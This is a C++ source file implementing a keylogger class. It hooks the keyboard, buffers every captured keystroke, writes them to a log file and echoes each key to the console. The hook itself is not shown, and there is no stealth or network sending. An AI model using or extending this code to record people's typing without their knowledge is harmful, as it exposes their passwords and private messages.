#include "stdafx.h"
#include "Keylogger.h"


void Keylogger::start() {
	hook = new Hook();
	textBuffer = new vector<wchar_t>();
	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
	hook->setHook([this](wchar_t key[]) {
		keyboardHandler(key);
	});
	logFile.open(FILENAME, std::ios::app);
}

void Keylogger::keyboardHandler(wchar_t* keyText) {
	auto symbol = keyText;
	while (*symbol) {
		if (textBuffer->size() >= BUFFER_SIZE) {
			writeToFile();
			textBuffer->clear();
		}
		textBuffer->push_back(*symbol);
		symbol++;
	}
	std::wcout << L"key " << keyText << L"\n";
}

void Keylogger::writeToFile() {
	logFile.write(&textBuffer->at(0), textBuffer->size());
	logFile << std::flush;
}

void Keylogger::stop() {
	writeToFile();
	textBuffer->clear();

	hook->unsetHook();
	logFile.close();
}

Keylogger::~Keylogger() {
	stop();
	delete hook;
	delete textBuffer;
}
